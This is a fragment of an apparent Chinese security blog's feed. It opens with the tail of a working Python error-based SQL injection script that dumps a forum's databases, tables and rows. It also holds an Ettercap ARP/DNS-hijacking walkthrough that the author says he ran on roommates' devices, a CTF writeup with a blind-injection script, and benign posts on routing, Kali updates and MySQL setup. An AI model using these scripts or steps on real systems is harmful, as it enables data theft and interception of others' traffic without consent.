count(*),concat(floor(rand(0)*2),0x3a,(select database()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    c_db=re.findall(p,str).pop()    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select user()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    user=re.findall(p,str).pop()    payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select version()),0x3a)x from information_schema.tables group by x)a)#&apos;}    content=requests.get(url=url,params=payload)    str=content.text    p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)    version=re.findall(p,str).pop()    print &quot;current database:%s\nuser:%s\nversion:%s\n&quot;%(c_db,user,version)def getdbs(url):    i=0    while 1:        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select schema_name from information_schema.schemata limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(i)}        content=requests.get(url=url,params=payload)        str=content.text        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)        dbs=re.findall(p,str)        if dbs==[]:            break        else:            print dbs[-1]            i=i+1def gettables(url,db):    print &quot;select database:%s&quot;%(db)    hexdb=&apos;0x&apos;+db.encode(&quot;hex&quot;)    i=0    while 1:        payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select table_name from information_schema.tables where table_schema=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hexdb,i)}        content=requests.get(url=url,params=payload)        str=content.text        p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)        table=re.findall(p,str)        if table==[]:            break        else:            print table[-1]            i=i+1def getcolumns(url,table,db):    print &quot;select database:%s\nselect table:%s&quot;%(db,table)    hextables=[]    hextables.append(&quot;0x&quot;+table.encode(&quot;hex&quot;))    hextables.append(&quot;0x&quot;+(&quot;cdb_&quot;+table).encode(&quot;hex&quot;))    if table.find(&quot;uc_&quot;)==0:        hextables.append(&quot;0x&quot;+(table.split(&quot;_&quot;)[1]).encode(&quot;hex&quot;))    print hextables    for hextable in hextables:        i=0        while 1:            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select column_name from information_schema.columns where table_name=%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(hextable,i)}            content=requests.get(url=url,params=payload)            str=content.text            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)            column=re.findall(p,str)            if column==[]:                break            else:                print column[-1]            i=i+1        print idef dumpdata(url,column,table,db):    print &quot;select database:%s\nselect table:%s\nselect column:%s&quot;%(db,table,column)    column=column.replace(&quot;,&quot;,&quot;,0x3a,&quot;)    tables=[]    tables.append(table)    tables.append(&quot;cdb_&quot;+table)    if table.find(&quot;uc_&quot;)&gt;=0:        tables.append(table.split(&quot;_&quot;)[1])    print tables    for table in tables:        i=0        while 1:            payload={&apos;action&apos;:&apos;grouppermission&apos;,&apos;gids[99]&apos;:&quot;&apos;&quot;,&apos;gids[100][0]&apos;:&apos;) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select concat(%s) from %s.%s limit %d,1),0x3a)x from information_schema.tables group by x)a)#&apos;%(column,db,table,i)}            content=requests.get(url=url,params=payload)            str=content.text            p=re.compile(r&quot;Duplicate entry &apos;1:(.*?):&apos; for key&quot;)            data=re.findall(p,str)            if data==[]:                break            else:                print data[-1]                i=i+1if __name__==&quot;__main__&quot;:    main()</code></pre><h3 id="官方文档链接"><a href="#官方文档链接" class="headerlink" title="官方文档链接"></a>官方文档链接</h3><p><strong><a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc.zh/" title="BeautifulSoup官方文档" target="_blank" rel="external">BeautifulSoup官方文档</a></strong></p><p><strong><a href="http://docs.python-requests.org/zh_CN/latest/" title="requests官方文档" target="_blank" rel="external">requests官方文档</a></strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;用python爬取补天src列表&quot;&gt;&lt;a href=&quot;#用python爬取补天src列表&quot; class=&quot;headerlink&quot; title=&quot;用python爬取补天src列表&quot;&gt;&lt;/a&gt;用python爬取补天src列表&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;分享一个我写
      
    
    </summary>
    
      <category term="python爬虫挑战" scheme="http://yoursite.com/categories/python%E7%88%AC%E8%99%AB%E6%8C%91%E6%88%98/"/>
    
    
      <category term="人生苦短，我用python" scheme="http://yoursite.com/tags/%E4%BA%BA%E7%94%9F%E8%8B%A6%E7%9F%AD%EF%BC%8C%E6%88%91%E7%94%A8python/"/>
    
  </entry>
  
  <entry>
    <title>Ettercap实现局域网dns劫持</title>
    <link href="http://yoursite.com/2018/03/21/dns_spoof/"/>
    <id>http://yoursite.com/2018/03/21/dns_spoof/</id>
    <published>2018-03-21T15:43:32.584Z</published>
    <updated>2018-03-21T17:22:59.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ettercap实现局域网dns劫持百度"><a href="#Ettercap实现局域网dns劫持百度" class="headerlink" title="Ettercap实现局域网dns劫持百度"></a>Ettercap实现局域网dns劫持百度</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>很久之前做过的一个实验，利用kali的Ettercap进行局域网的dns劫持，今天实验课老师碰巧又提到了，于是又做了做，这是一个很好玩的实验</strong></p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中，连接自己的RT3070的无线网卡（网卡一定要是kali2.0支持的型号），同时开启apache服务，进行dns劫持</strong></p><p><strong>2.自己的真实机，连接本机电脑的无线网卡</strong></p><p><strong>3.RT3070网卡和本机电脑网卡连接同一wifi，保证kali和自己的PC在同一局域网，用kali对自己的PC进行DNS缓存投毒</strong></p><p><strong>4.用到的软件:kali中的Ettercap，一个集成工具，里面包括了局域网主机扫描，arp欺骗，DNS劫持等功能</strong></p><p><strong>5.浏览器:谷歌浏览器</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>DNS，全称为域名解析协议，是一种将域名解析为ip地址的协议，基于UDP的53端口。比如我们在浏览器访问百度域名，会先向dns服务器发送一次dns请求报文，询问百度的ip地址，dns服务器经过查询（或递归查询）会将百度的域名以及对应的ip地址以dns响应报文的形式发回给我们，然后我们才可以与所对应的ip建立TCP连接进行网络通信。dns劫持建立在arp欺骗的基础上，关于arp的文章之前有写过，链接：<a href="http://lawlietweb.com/2018/01/12/arpattack/" title="arp协议分析&amp;python编程实现arp欺骗抓图片" target="_blank" rel="external">arp协议分析&amp;python编程实现arp欺骗抓图片</a>，通过arp欺骗可以监听受害者机器到网关之间的流量，如果可以过滤协议为UDP，端口为53端口的数据报文，也就是DNS报文，并且将dns响应中的域名所对应的ip地址改写成我们服务器的ip，受害者机器就会与我们的机器进行连接通信，这就是dns投毒的基本原理，kali的Ettercap就可以做到这一点，当然明白了攻击原理，自己编程实现也是可以的，python的scapy库便可以做到，之后有时间会尝试写一下</strong></p><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p><strong>1.开启ip转发功能，默认是关闭的</strong></p><pre><code>echo &quot;1&quot;&gt; /proc/sys/net/ipv4/ip_forward</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/510leEijb8.png?imageslim" alt="mark"></p><p><strong>2.查看kali的ip为192.168.0.106，并且修改Ettercap的配置文件，添加一条dns解析记录（A记录）</strong></p><pre><code>* A 192.168.0.106</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/1J1aH0aLj8.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/HDi1m44bg0.png?imageslim" alt="mark"><br><strong>意思是将所有域名都解析到我们kali的ip上</strong></p><p><strong>3.<code>service apache2 start</code>开启apache服务,并在/var/www/html下新建index.html,就是我们攻击后想要看到的效果页面，自己简单写了个有意思的页面，效果如下</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/BkE7FLFB94.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/17EChCh7Jb.png?imageslim" alt="mark"><br><strong>4.准备工作都做好了，接下来使用Ettercap开始我们的攻击,启动Ettercap图形界面</strong></p><pre><code>ettercap -G</code></pre><p><strong>点击Sniff–&gt;Unified sniffing</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/9ADDfJAl0L.png?imageslim" alt="mark"><br><strong>在这选择wlan0无线网卡，因为kali上网使用的是无线网卡，如果虚拟机插网线桥接，这里选eth0</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/LID0a4lc5G.png?imageslim" alt="mark"><br><strong>接下来点击Hosts–&gt;Scan for hosts,扫描局域网中存活的ip，寻找攻击目标</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/dL74JliCG6.png?imageslim" alt="mark"><br><strong>显示扫到5个主机，点击Hosts list查看</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/K322B8ffKI.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/KaHCj7c2HI.png?imageslim" alt="mark"><br><strong>在ip列表里可以看到网关ip192.168.0.1，还有我们的物理机ip192.168.0.103，接下来开始arp欺骗，具体操作将192.168.0.1Add to Target1，将受害PCip192.168.0.103Add to Target2，然后点击Mitm–&gt;ARP poisoning</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/AFd0bJh14I.png?imageslim" alt="mark"><br><strong>勾选第一个</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/L4bIEcmk0f.png?imageslim" alt="mark"><br><strong>ARP欺骗便开始了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/B5B7GA8cl7.png?imageslim" alt="mark"><br><strong>下面开始dns劫持，点击Plugins–&gt;Manage the plugins</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/FlGj1GEkJK.png?imageslim" alt="mark"><br><strong>选择dns_spood插件，便开始dns欺骗了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/fk3Hf84H0D.PNG" alt="mark"><br><strong>我们这时访问百度，就会看到dns已经被劫持，嘿嘿嘿</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/m725g55cLg.PNG" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180322/3L2dAFhm3i.PNG" alt="mark"><br><strong>同时欺骗了室友的电脑和手机也成功，差点没被打死。。。。就是皮</strong></p><p><strong>最后说一下，dns劫持这种攻击不仅限于恶作剧，利用这种攻击，我们还可以诱导受害者进入我们构造的恶意软件下载页面，下载恶意软件以让我们对对方的电脑做一些事情</strong></p><p><strong>老铁们遇到dns劫持这种恶作剧，打开cmd命令行输入</strong></p><pre><code>ipconfig /flushdns</code></pre><p><strong>刷新dns缓存即可，然后找到那个皮的人。。。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Ettercap实现局域网dns劫持百度&quot;&gt;&lt;a href=&quot;#Ettercap实现局域网dns劫持百度&quot; class=&quot;headerlink&quot; title=&quot;Ettercap实现局域网dns劫持百度&quot;&gt;&lt;/a&gt;Ettercap实现局域网dns劫持百度&lt;/h1&gt;&lt;
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="dns劫持" scheme="http://yoursite.com/tags/dns%E5%8A%AB%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>解决kali执行apt update时报错</title>
    <link href="http://yoursite.com/2018/03/19/kali%20update%20error/"/>
    <id>http://yoursite.com/2018/03/19/kali update error/</id>
    <published>2018-03-19T15:27:48.136Z</published>
    <updated>2018-03-19T15:32:09.285Z</updated>
    
    <content type="html"><![CDATA[<h1 id="解决kali执行apt-update时报错"><a href="#解决kali执行apt-update时报错" class="headerlink" title="解决kali执行apt update时报错"></a>解决kali执行apt update时报错</h1><p><strong>更新kali时在执行apt update遇到如下错误</strong></p><pre><code>Get:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease [30.5 kB]Err:1 http://kali.mirror.garr.it/mirrors/kali kali-rolling InReleaseThe following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;Reading package lists... DoneBuilding dependency tree       Reading state information... Done945 packages can be upgraded. Run &apos;apt list --upgradable&apos; to see them.W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://kali.mirror.garr.it/mirrors/kali kali-rolling InRelease: The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Failed to fetch http://http.kali.org/kali/dists/kali-rolling/InRelease  The following signatures were invalid: EXPKEYSIG ED444FF07D8D0BF6 Kali Linux Repository &lt;devel@kali.org&gt;W: Some index files failed to download. They have been ignored, or old ones used instead.</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/9DHI71m4ee.png?imageslim" alt="mark"></p><p><strong>解决方法</strong></p><pre><code>apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/KGI19B7egm.png?imageslim" alt="mark"></p><p><strong>再次执行就可以成功执行了</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/m3L1eiGCcd.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;解决kali执行apt-update时报错&quot;&gt;&lt;a href=&quot;#解决kali执行apt-update时报错&quot; class=&quot;headerlink&quot; title=&quot;解决kali执行apt update时报错&quot;&gt;&lt;/a&gt;解决kali执行apt update时报错&lt;/
      
    
    </summary>
    
      <category term="kali" scheme="http://yoursite.com/categories/kali/"/>
    
    
      <category term="kali" scheme="http://yoursite.com/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>eNSP静态路由配置</title>
    <link href="http://yoursite.com/2018/03/18/routestatic/"/>
    <id>http://yoursite.com/2018/03/18/routestatic/</id>
    <published>2018-03-18T15:32:19.761Z</published>
    <updated>2018-03-19T05:39:27.432Z</updated>
    
    <content type="html"><![CDATA[<h1 id="eNSP静态路由配置"><a href="#eNSP静态路由配置" class="headerlink" title="eNSP静态路由配置"></a>eNSP静态路由配置</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>这篇文章的内容来自老师上课布置的一个任务，配置静态路由，想学习好网络安全，这种网络协议的基础是必须要掌握的，也是为了之后的入侵检测系统学习打下基础</strong></p><h3 id="课堂给出的拓扑如下"><a href="#课堂给出的拓扑如下" class="headerlink" title="课堂给出的拓扑如下"></a>课堂给出的拓扑如下</h3><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180318/fBGD2l9b88.png?imageslim" alt="mark"></p><p><strong>要求四个路由器之前相互可以通信，自己动手实践了一下,将自己的配置过程记录下来，也算课堂的时间没有白费</strong></p><h3 id="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"><a href="#在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下" class="headerlink" title="在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下"></a>在配置静态路由之前首先要保证路由器与PC之间以及路由器和路由器之间是通的，各路由器上配置如下</h3><pre><code>R1sysysname r1int e0/0/0ip add 10.10.10.1 24qint g0/0/0ip add 2.2.2.2 30qint g0/0/1ip add 3.3.3.2 30qR2sysysname r2int e0/0/0ip add 192.168.2.1 24qint g0/0/0ip add 2.2.2.1 301int g0/0/1ip add 1.1.1.1 30qR3sysysname r3int e0/0/0ip add 172.16.2.1 24qint g0/0/0ip add 4.4.4.1 30qint g0/0/1ip add 3.3.3.1 24qR4sysysname r4int g0/0/1ip add 1.1.1.2 30qint g0/0/0ip add 4.4.4.2 30q</code></pre><h3 id="配置静态路由"><a href="#配置静态路由" class="headerlink" title="配置静态路由"></a>配置静态路由</h3><p><strong>配置之前要先明白什么是下一跳地址，以拓扑举例，比如PC1要经过路由R1与PC2通讯，那么在路由R1的路由表中，下一跳地址应该为路由R2:2.2.2.1,所以在R1的路由表中添加一条静态路由</strong></p><pre><code>ip route-static 192.168.2.1 255.255.255.0 2.2.2.1</code></pre><p><strong>同时要在R2的路由表中添加一条PC2到PC1的静态路由</strong></p><pre><code>ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>了解了上面的基础，剩下的就是在每个路由器里面一一配置，各路由器配置如下</strong> </p><p><strong>PC1到PC2之间的通信配置</strong></p><pre><code>R1：ip route-static 192.168.2.1 255.255.255.0 2.2.2.1R2：ip route-static 10.10.10.1 255.255.255.0 2.2.2.2</code></pre><p><strong>测试PC1和PC2互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/GH301D7akb.png?imageslim" alt="mark"><br><strong>PC1到PC3之间的通信配置</strong></p><pre><code>R1：ip route-static 172.16.2.1 255.255.255.0 3.3.3.1R3：ip route-static 10.10.10.1 255.255.255.0 3.3.3.2</code></pre><p><strong>测试PC1和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/B5mBkk2hmA.png?imageslim" alt="mark"><br><strong>PC2到PC3之间的通信配置</strong></p><pre><code>R2：ip route-static 172.16.2.1 255.255.255.0 1.1.1.2R4：ip route-static 172.16.2.1 255.255.255.0 4.4.4.1R3：ip route-static 192.168.2.1 255.255.255.0 4.4.4.2R4：ip route-static 192.168.2.1 255.255.255.0 1.1.1.1</code></pre><p><strong>测试PC2和PC3互通</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180319/1jj7hDj12C.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;eNSP静态路由配置&quot;&gt;&lt;a href=&quot;#eNSP静态路由配置&quot; class=&quot;headerlink&quot; title=&quot;eNSP静态路由配置&quot;&gt;&lt;/a&gt;eNSP静态路由配置&lt;/h1&gt;&lt;h3 id=&quot;序&quot;&gt;&lt;a href=&quot;#序&quot; class=&quot;headerlink
      
    
    </summary>
    
      <category term="网络基础" scheme="http://yoursite.com/categories/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="网络基础" scheme="http://yoursite.com/tags/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>N1CTF2018 77777 writeup</title>
    <link href="http://yoursite.com/2018/03/12/N1CTF2018/"/>
    <id>http://yoursite.com/2018/03/12/N1CTF2018/</id>
    <published>2018-03-12T02:53:49.460Z</published>
    <updated>2018-03-12T02:58:46.941Z</updated>
    
    <content type="html"><![CDATA[<h1 id="N1CTF2018-77777-writeup"><a href="#N1CTF2018-77777-writeup" class="headerlink" title="N1CTF2018 77777 writeup"></a>N1CTF2018 77777 writeup</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>之前比赛开始时看了签到题，死活没写出来，泪，之后听同学说起了这道题，在结束前不到一小时做了做，无奈比赛结束，flag没交上去，那就记录一下过程吧</strong></p><h3 id="题目：77777"><a href="#题目：77777" class="headerlink" title="题目：77777"></a>题目：77777</h3><p><strong>题目说”77777” is my girlfriend’s nickname，出题人大佬的女朋友外号叫77777，当然以我看过签到题的心情来看，这和道题并没什么关系，重点还在题目中给的一小段代码中，代码如下</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/a2EE46LmeH.png?imageslim" alt="mark"></p><p><strong>代码接收post参数中的flag和hi，拼接后更新数据库的points值，并在<code>http://47.97.168.223/#profile</code>页面中显示points值，简单来说，post参数可控，我们可以提交参数构造数据库中女朋友的points，并且在页面显示points值</strong></p><pre><code>update users set points=&apos;post过来的flag和hi拼接后的结果&apos;</code></pre><p><strong>当然hi是经过waf函数处理的，看来是绕waf的注入，简单了测试了一下，过滤了updatexml,extractvalue,database()等函数，报错回显这个思路暂时放弃了，因为information_schema也被过滤了，做起来会很麻烦</strong></p><p><strong>题目的第二个提示</strong></p><pre><code>the flag is `admin&apos;s password`:)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/Hj66G37HjJ.png?imageslim" alt="mark"><br><strong>猜测数据库里有password字段,由此想到第二个思路，提交:</strong></p><pre><code>flag=任意数字&amp;hi=任意数字 and (构造逻辑判断)</code></pre><p><strong>数据库语句变为:</strong></p><pre><code>update users set points=任意数字 and （构造逻辑判断）</code></pre><p><strong>如果逻辑判断为真，将points值更新为1，为假则更新为0,构造逻辑判断的时候发现=也被过滤，用like替代即可,思路有了开始写脚本</strong></p><pre><code>import requestsimport stringlist=string.maketrans(&quot;&quot;,&quot;&quot;)[33:127]#所有可显示字符，后面猜测password内容使用url=&quot;http://47.97.168.223/#profile&quot;#显示分数页面#read password#i=0#while 1:#    payload={&apos;flag&apos;:1,&apos;hi&apos;:&apos;1 and length(password) like %d&apos;%(i)}#    html=requests.post(url=url,data=payload).content#    if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明长度正确，输出并break#        print i#        break#    else:#        i=i+1#password length is 13#read passwordi=0for i in range(1,14):    for j in list:        payload={&apos;flag&apos;:1,&apos;hi&apos;:&quot;1 and substr(password,%d,1) like &apos;%s&apos;&quot;%(i,j)}        html=requests.post(url=url,data=payload).content        if &quot;&lt;grey&gt;My Points&lt;/grey&gt; | 1&lt;br/&gt;&quot; in html:#points为1说明内容正确，输出并break            print j            break#flag is HE3L3LOCAT233</code></pre><p><strong>脚本通过<code>1 and length(password) like %d</code>来判断password长度为13，为真时页面points显示为1，否则为0</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/823DJ2bh5f.png?imageslim" alt="mark"></p><p><strong>然后<code>1 and substr(password,%d,1) like &#39;%s&#39;</code>循环判断password内容，为真时页面的points值显示为1，否则为0</strong></p><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180312/FGB5bcl7F0.png?imageslim" alt="mark"></p><p><strong>flag为N1CTF{HE3L3LOCAT233}</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;N1CTF2018-77777-writeup&quot;&gt;&lt;a href=&quot;#N1CTF2018-77777-writeup&quot; class=&quot;headerlink&quot; title=&quot;N1CTF2018 77777 writeup&quot;&gt;&lt;/a&gt;N1CTF2018 77777 w
      
    
    </summary>
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ctf" scheme="http://yoursite.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>centos7安装mysql</title>
    <link href="http://yoursite.com/2018/02/27/centos7mysql/"/>
    <id>http://yoursite.com/2018/02/27/centos7mysql/</id>
    <published>2018-02-27T14:34:28.576Z</published>
    <updated>2018-02-27T14:22:09.592Z</updated>
    
    <content type="html"><![CDATA[<h1 id="centos7安装mysql"><a href="#centos7安装mysql" class="headerlink" title="centos7安装mysql"></a>centos7安装mysql</h1><p><strong>由于MySQL为Oracle公司所拥有因此不再免费，所以CentOS7以上的版本已经使用MariaDB替代了收费的MySQL，如直接用yum安装则会安装MariaDB。这篇文章记录了如何在centos7上安装mysql</strong></p><p><strong>1.卸载之前安装的MariaDB</strong></p><pre><code>rpm -qa | grep mariadb(列出所有被安装的rpm package)</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/l9iEaD0a5a.PNG" alt="mark"><br><strong><code>rpm -e</code>依次卸载</strong></p><pre><code>rpm -e mariadb-5.5.56-2.el7.x86_64rpm -e --nodeps mariadb-libs-5.5.56-2.el7.x86_64rpm -e --nodeps mariadb-devel-5.5.56-2.el7.x86_64</code></pre><p><strong>2.到<a href="https://dev.mysql.com/downloads/repo/yum/" title="mysql官网" target="_blank" rel="external">mysql官网</a>找到对应版本的mysql下载（本例中为mysql57-community-release-el7-11.noarch.rpm），上传至服务器</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/Fdg5fbh339.png?imageslim" alt="mark"></p><p><strong>3.下载完毕后输入<code>md5sum mysql57-community-release-el7-9.noarch.rpm</code>生成MD5值并确保同官方网站上的MD5值相同。注意：建议运行此命令以确保文件无损坏</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/B3fC28IJjm.png?imageslim" alt="mark"></p><p><strong>4.输入<code>rpm -ivh mysql57-community-release-el7-9.noarch.rpm</code>并按回车键进行安装YUM源RPM安装包</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/BkFBCkAj2I.png?imageslim" alt="mark"></p><p><strong>5.因上一步已添加新的YUM存储库，所以直接就可以用yum命令安装mysql了</strong></p><pre><code>yum install -y mysql-server</code></pre><p><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/2jih4JIeeF.png?imageslim" alt="mark"></p><p><strong>6.可以看到mysql已经成功安装</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/3iAGB7h54A.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180227/lG0d7L9Dc7.png?imageslim" alt="mark"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;centos7安装mysql&quot;&gt;&lt;a href=&quot;#centos7安装mysql&quot; class=&quot;headerlink&quot; title=&quot;centos7安装mysql&quot;&gt;&lt;/a&gt;centos7安装mysql&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;由于MySQL为Oracle
      
    
    </summary>
    
      <category term="其他" scheme="http://yoursite.com/categories/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="mysql" scheme="http://yoursite.com/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>arp协议分析&amp;python编程实现arp欺骗抓图片</title>
    <link href="http://yoursite.com/2018/01/12/arpattack/"/>
    <id>http://yoursite.com/2018/01/12/arpattack/</id>
    <published>2018-01-12T14:24:48.076Z</published>
    <updated>2018-04-20T11:18:28.769Z</updated>
    
    <content type="html"><![CDATA[<h1 id="arp协议分析-amp-python编程实现arp欺骗抓图片"><a href="#arp协议分析-amp-python编程实现arp欺骗抓图片" class="headerlink" title="arp协议分析&amp;python编程实现arp欺骗抓图片"></a>arp协议分析&amp;python编程实现arp欺骗抓图片</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>学校tcp/ip协议分析课程老师布置的任务，要求分析一种网络协议并且研究安全问题并编程实现，于是我选择了研究arp协议，并且利用python编程实现一次简单的局域网arp攻击，抓取室友网上浏览的图片（滑稽脸）</strong></p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p><strong>1.kali2.0操作系统，本人用的32位的，装在vm12虚拟机中</strong></p><p><strong>2.python2.7.13，kali2.0自带</strong></p><p><strong>3.一个局域网和室友的电脑</strong></p><p><strong>4.kali所支持的无线网卡，型号为RT3070，某宝四十多就能能买到，主要用来抓取无线数据包，因为windows自带无线网卡kali不支持</strong></p><p><strong>选择kali支持的无线网卡可参考链接</strong><br><code>http://www.freebuf.com/articles/wireless/140065.html</code></p><p><strong>不过要注意一点，wn722n型号的无线网卡只有v1才支持kali，现在网上大多数卖的都是v2的，如果选择这一款买的时候要好好看一下，不要选错</strong></p><h3 id="arp协议研究"><a href="#arp协议研究" class="headerlink" title="arp协议研究"></a>arp协议研究</h3><p><strong>在进行arp攻击之前，先来研究一下arp协议</strong></p><p><strong>arp协议简介：arp协议的全称为地址解析协议，是一种工作在网络层的协议，是一种将ip地址转换为MAC地址（物理地址）的协议</strong></p><p><strong>这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。因为在OSI七层模型中，ip地址在第三层网络层，传送的是数据报，mac地址在第二层数据链路层，传送的是数据帧，二层的以太网交换设备并不能识别32位的IP地址，它们是以48位以太网地址（就是我们常说的MAC地址）传输以太网数据包（帧）的，局域网的机器要和其他机器进行通信，首先要获取对方的物理地址，所以arp协议便把ip地址转换为物理地址来实现这种对应关系</strong></p><p><strong>arp协议数据包</strong></p><p><strong>arp数据包分为arp请求包和arp响应包，数据包格式如下图，arp数据包长度为28字节</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180113/D69hl1lIGD.PNG" 